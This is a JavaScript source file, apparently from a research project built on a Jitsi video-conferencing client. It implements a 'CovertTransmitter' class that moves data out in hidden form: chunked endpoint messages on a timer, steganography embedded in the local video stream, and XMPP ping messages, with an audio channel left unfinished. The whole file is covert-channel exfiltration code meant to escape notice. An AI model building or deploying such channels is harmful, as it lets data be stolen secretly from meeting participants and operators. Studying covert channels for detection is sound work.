/* global APP, splitString */

import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';

import CovertCommunicationInitiator from './CovertCommunicationInitiator';
import VideoSteganoEffect from './VideoSteganoEffect';


/**
 * Implementation of different convert channel methods
 */
export default class CovertTransmitter extends CovertCommunicationInitiator {

    /**
     *
     */
    get option() {
        return {
            'endpoint': 'useEndpoint',
            'video': 'useVideo',
            'audio': 'useAudio',
            'xmpp': 'useXMPP'
        };
    }

    /**
     *
     * @param {object} user
     * @param {object} configuration
     * @param {string} data
     */
    constructor(user, configuration, communicationName, extractionProcess, data) {
        super(user, configuration, communicationName, extractionProcess);
        this.data = data;
    }

    sleep = milliseconds => new Promise(resolve => setTimeout(resolve, milliseconds))

    /**
     * Sending data using simple endpoint method
     * @param {any} data - specified data to be sent
     */
    async useEndpoint() {
        for (const chunkData of splitString(this.data, this.configuration.chunkSize)) {
            await this.sleep(this.configuration.pingInterval);

            APP.conference.sendEndpointMessage(this.user.getId(), {
                type: 'reply',
                data: chunkData
            });
        }
        this.dispatchExtractionEnded();
    }

    /**
     * Creates new Steganography effect on the specified media stream.
     * @param {MediaStream} stream - Video stream you want to change
     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
     * @param {object} options - Options about the steganography. Throughtput etc.
     * @returns Promise of stegano effect
     */
    _createSteganoEffect(stream: MediaStream) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, this.data, this.configuration));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    async useVideo() {
        const localVideo = APP.conference.localVideo;

        this._createSteganoEffect(localVideo.stream, this.data, this.configuration.method).then(effect => {
            localVideo.setEffect(effect);
        });
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    async useAudio() {
        // TODO: not working, create a hidden channel inside the audio using AudioMixer
        const desktopAudio = APP.conference._desktopAudioStream;
        const localAudio = APP.conference.localAudio;

        new AudioMixerEffect(desktopAudio).then(effect => {
            localAudio.setEffect(effect);
        });

    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    async useXMPP() {
        const splitedData = splitString(this.data, this.configuration.chunkSize);
        const intervalRef = setInterval(() => {
            if (!splitedData.length) {
                clearInterval(intervalRef);
                this.dispatchExtractionEnded();

                return;
            }
            this.extractionPing(message => {
                console.log('success', message, splitedData);
            }, message => {
                console.log('fail', message);

                // console.log('Data sent:', splitedData);
            }, splitedData.shift());
        }, this.configuration.pingInterval);
    }

    /**
     *
     * @returns {string}
     */
    getUsedMethod() {
        const usedMethod = this.configuration.method;

        console.log(`Method ${usedMethod} used`);

        return this.option[usedMethod];
    }
}
